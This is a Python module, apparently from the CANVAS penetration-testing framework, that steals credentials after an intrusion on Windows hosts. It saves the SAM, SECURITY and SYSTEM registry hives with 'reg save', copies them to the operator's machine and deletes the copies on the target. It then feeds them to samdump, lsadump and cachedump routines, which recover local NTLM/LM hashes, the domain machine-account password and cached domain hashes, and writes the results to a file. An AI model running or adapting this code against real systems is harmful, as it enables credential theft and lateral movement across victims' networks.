#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  getwindowscredentials.py
## Description:
##            :
## Created_On :  Fri Jan 11 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging
import tempfile

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from win32MosdefShellServer import *

NAME                   = "getwindowscredentials"
DESCRIPTION            = "Extract local and domain credentials"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
You need to have Admin privileges to run this module. It retrieves both:
    - HKLM\SAM
    - HKLM\SECURITY
    - HKLM\SYSTEM
and extracts hashes out of them using the 3 corresponding modules.
"""

VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Windows"] ]

import libs.libwincreds.libwincreds as libwincreds

RegistryKeys = [ 'sam', 'security', 'system' ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result                  = []
        self.name                    = NAME
        self.savefile                = "windows_credentials.txt"
        self.files                   = {}
        self.files['sam_file']       = ''
        self.files['security_file']  = ''
        self.files['system_file']    = ''
        self.modules                 = [
                                         { 'mod_name': 'samdump',
                                           'mod_args': self.samdump_prepare_args,
                                           'callback': self.samdump_handler },
                                         { 'mod_name': 'lsadump',
                                           'mod_args': self.lsadump_prepare_args,
                                           'callback': self.lsadump_handler },
                                         { 'mod_name': 'cachedump',
                                           'mod_args': self.cachedump_prepare_args,
                                           'callback': self.cachedump_handler },
                                       ]
        self.log                     = ''
        self.node_ips                = []
        self.savepath                = None

    def key_2_attribute(self, key):
        """
        Short function to link self.modules to RegistryKeys.
        """

        if key == 'sam':
            return 'sam_file'
        elif key == 'security':
            return 'security_file'
        else:
            return 'system_file'

    def getargs(self):
        """
        Parsing of CLI/GUI arguments.
        """
        self.savefile = self.argsDict.get("savefile", self.savefile)

    def set_progress(self, percent, msg=None):
        """
        Controlling the GUI's indicator.
        """
        if msg:
            self.setInfo(msg)
        self.setProgress(percent)

    ###
    # Subfunctions
    ###

    def __generate_tmp_filename(self, prefix="xxx", suffix=".reg"):
        """
        Generates a random filename.
        """
        s = os.urandom(3)
        filename = '_'.join([prefix, s.encode('hex')])
        return filename + suffix

    # Ripped from libs/pyjon/utils/main.py
    def __generate_tmp_file(self, prefix="tmp_"):
        """
        Creates a tempfile in the most secure manner possible, make sure is it 
        closed and return the filename for easy usage.
        """
        file_handle, filename = tempfile.mkstemp(prefix=prefix)
        tmpfile = os.fdopen(file_handle, "rb")
        tmpfile.close()
        return filename

    ###
    # The API
    ###

    def samdump_prepare_args(self):
        """
        Prepares the arguments to call samdump.
        """

        args = {}
        args['savefile'] = 'samdump_%s.txt' % '_'.join(self.node_ips)
        args['sam_file'] = self.files['sam_file']
        args['system_file'] = self.files['system_file']

        if not args['sam_file'] or not args['system_file']:
            return None

        return args

    def samdump_handler(self, current_node_result, module_results):
        """
        Handles the parsing of samdump's results.
        We extract local user accounts.
        Note: In the case of AD servers, local users are also domain users.
        """

        users = module_results[0]
        if not current_node_result['credentials']['workgroup'].has_key('users'):
            current_node_result['credentials']['workgroup']['users'] = users
        else:
            current_node_result['credentials']['workgroup']['users'] += users

    def lsadump_prepare_args(self):
        """
        Prepares the arguments to call lsadump.
        """

        args = {}
        args['savefile'] = 'lsadump_%s.txt' % '_'.join(self.node_ips)
        args['security_file'] = self.files['security_file']
        args['system_file'] = self.files['system_file']

        if not args['security_file'] or not args['system_file']:
            return None

        return args

    def lsadump_handler(self, current_node_result, module_results):
        """
        Handles the parsing of lsadump's results.
        We only extract the computer account which is part of the domain.
        """

        secrets = module_results[0]
        node_hostname = self.node.shell.gethostname()
        node_domain = self.node.shell.getdomain()

        computers = []
        for secret in secrets:
            if secret['name'] == '$MACHINE.ACC':

                # Note: For some reason, the $MACHINE.ACC might be a huge buffer
                # of random characters. Currently we have no idea of how to use it
                # but for sure it cannot be converted into NTLM hash as it is since
                # the classic unicode conversion cannot be applied.
                if len(secret['decrypted_value']) >= 4 \
                   and (secret['decrypted_value'][1] != '\0' \
                   or secret['decrypted_value'][3] != '\0'):
                    continue

                computer = {}
                computer['username'] = node_hostname + '$'
                try:
                    computer['password'] = secret['decrypted_value'].decode('utf-16-le')
                    computer['ntlm_hash'] = libwincreds.ComputeNTLM(computer['password'])
                except Exception as e:
                    logging.debug('Password problem with $MACHINE.ACC, skipping.')
                    continue

                computer['domain'] = node_domain['DomainNameDns']
                computers.append(computer)

        if len(computers):
            if not current_node_result['credentials']['domain'].has_key('computers'):
                current_node_result['credentials']['domain']['computers'] = computers
            else:
                current_node_result['credentials']['domain']['computers'] += computers

    def cachedump_prepare_args(self):
        """
        Prepares the arguments to call cachedump.
        """

        args = {}
        args['savefile'] = 'cachedump_%s.txt' % '_'.join(self.node_ips)
        args['security_file'] = self.files['security_file']
        args['system_file'] = self.files['system_file']

        if not args['security_file'] or not args['system_file']:
            return None

        return args

    def cachedump_handler(self, current_node_result, module_results):
        """
        Handles the parsing of cachedump's results.
        """

        users = module_results[0]

        if not current_node_result['credentials']['domain'].has_key('users'):
            current_node_result['credentials']['domain']['users'] = users
        else:
            current_node_result['credentials']['domain']['users'] += users

    def extract_registry_content(self, keyname):
        """
        Extracts the content from HKLM\{SAM,Security,System} and stores it into
        a temporary file on the CANVAS host.
        """

        try:
            
            fname = self.__generate_tmp_filename('regf')
            ret = self.node.shell.runcommand('reg save hklm\\%s c:\\%s' % (keyname, fname))
            # The reason we only warn is because of locales. We could possibly
            # have a non english return message.
            if not 'The operation completed successfully.' in ret:
                logging.warn('Likely failed to dump HKLM\\%s' % keyname.upper())

            dest_fname = self.__generate_tmp_file()
            self.node.shell.download('C:\\%s' % fname, dest=dest_fname)
            ret = self.node.shell.unlink('C:\\%s' % fname)
            return 0, dest_fname

        except Exception as e:
            return -1, None

    def display_results(self):
        """
        Displays the result on the console.
        """

        self.log = '\n'
        for i in xrange(len(self.result)):
            node = self.result[i]
            self.log += "[%02d] IPs: %s\n" % (i, ', '.join(node['ips']))
            self.log += "[%02d] Hostname: %s%s\n" % (i, node['hostname'], '.' + node['domain'] if node['domain'] else '')

            if node['credentials'].has_key('workgroup') \
               and node['credentials']['workgroup'].has_key('users'):
                self.log += "[%02d] Local accounts:\n" % i
                for user in node['credentials']['workgroup']['users']:
                    self.log += '[%02d]\t%s:\n' % (i, user['username'])
                    self.log += '[%02d]\t\tRid: %s\n' % (i, user['rid'])
                    if user.has_key('password'):
                        self.log += '[%02d]\t\tPassword: %s\n' % (i, user['password'])
                    if user.has_key('lm_hash'):
                        self.log += '[%02d]\t\tLM: %s\n' % (i, user['lm_hash'].encode('hex'))
                    if user.has_key('ntlm_hash'):
                        self.log += '[%02d]\t\tNTLM: %s\n' % (i, user['ntlm_hash'].encode('hex'))

            if node['credentials'].has_key('domain') \
               and (node['credentials']['domain'].has_key('users') \
               or node['credentials']['domain'].has_key('computers')):

                self.log += '[%02d] Domain accounts:\n' % (i)
                if node['credentials']['domain'].has_key('users'):
                    for user in node['credentials']['domain']['users']:
                        self.log += '[%02d]\t%s:\n' % (i, user['username'])
                        if user.has_key('domain'):
                            self.log += '[%02d]\t\tdomain: %s\n' % (i, user['domain'])
                        if user.has_key('mscashv1_hash'):
                            self.log += '[%02d]\t\tMSCASHv1: %s\n' % (i, user['mscashv1_hash'].encode('hex'))
                        if user.has_key('mscashv2_hash'):
                            self.log += '[%02d]\t\tMSCASHv2: %s\n' % (i, user['mscashv2_hash'].encode('hex'))

                if node['credentials']['domain'].has_key('computers'):
                    for computer in node['credentials']['domain']['computers']:
                        self.log += '[%02d]\t%s:\n' % (i, computer['username'])
                        if computer.has_key('domain'):
                            self.log += '[%02d]\t\tdomain: %s\n' % (i, computer['domain'])
                        if computer.has_key('password'):
                            self.log += '[%02d]\t\tpassword: %s\n' % (i, computer['password'])
                        if computer.has_key('ntlm_hash'):
                            self.log += '[%02d]\t\tNTLM: %s\n' % (i, computer['ntlm_hash'].encode('hex'))

        logging.info(self.log)

    def save_credentials(self):
        """
        Saves the credentials within a file.
        """

        if not self.savepath:
            return

        # We may need to save these credentials
        save_loc = os.path.join(self.savepath, self.savefile)

        try:
            fd = open(save_loc,"ab")
            fd.write(self.log)
            fd.close()
        except Exception as e:
            logging.warning('Could not save the credentials in %s' % save_loc)
        else:
            logging.info("Saved credentials to: %s" % save_loc)

    def run(self):
        self.setInfo("%s" % NAME)
        self.getargs()

        for node in self.argsDict["passednodes"]:

            self.node = node

            if node.nodetype == "LocalNode":
                logging.info('LocalNode is not supported, skipping node.')
                continue

            self.host = self.target.interface
            self.savepath = self.output(ip=self.node.get_interesting_interface(),
                                        subdir="windows_postintrusion")

            # A non Windows node is not handled
            if not self.is_windows_node():
                logging.error("%s node type not supported" % node.nodetype)
                self.setInfo("%s - done (failed)"%(NAME))
                return 0

            # If we are not even Administrator, it's not even worth to continue
            is_admin = self.exploitnodes("check_admin_user", nodes=[self.node])
            if not is_admin[0][0]:
                logging.error("Current user is not administrator")
                self.setInfo("%s - done (failed)"%(NAME))
                return 0

            # 1. we need to extract all the keys
            for key in RegistryKeys:
                ret, fname = self.extract_registry_content(key)
                if ret:
                    logging.info('Could not extract HKLM\\%s with the current privileges.' % key.upper())
                else:
                    logging.info('Successfully extracted HKLM\\%s.' % key.upper())

                self.files[self.key_2_attribute(key)] = fname

            # 2. Each submodule is then called if we can supply the correct number of 
            # arguments.
            current_node_result = {}
            node_domain = self.node.shell.getdomain()
            self.node_ips = [ ip for ip in self.node.getallips() if ip != '127.0.0.1' ]
            if node_domain:
                current_node_result['domain'] = node_domain['DomainNameDns']
            current_node_result['ips'] = self.node_ips
            current_node_result['hostname'] = self.node.shell.gethostname()
            current_node_result['credentials'] = {}
            current_node_result['credentials']['domain'] = {}
            current_node_result['credentials']['workgroup'] = {}

            self.set_progress(10)
            for i in xrange(len(self.modules)):

                module = self.modules[i]
                mod_name = module['mod_name']
                if module.has_key('callback'):
                    mod_func = module['callback']

                args = module['mod_args']()
                if not args:
                    logging.info('Cannot prepare the arguments, skipping module %s.' % mod_name)
                    continue

                logging.info('Calling module %s' % mod_name)
                ret = self.exploitnodes(mod_name, nodes=[self.node], args=args)
                logging.debug('Module returned:' + str(ret[0]))
                # 3. For each module we need to add its results to the global results 
                #    of the module.
                if mod_func:
                    mod_func(current_node_result, ret)

                nr_modules = len(self.modules)
                self.set_progress(10+int(90.0*(i+1)/nr_modules))

            self.result.append(current_node_result)

        self.display_results()
        self.save_credentials()

        self.set_progress(100)
        self.setInfo("%s - done (success: %s)" % (NAME, self.result))
        return 1
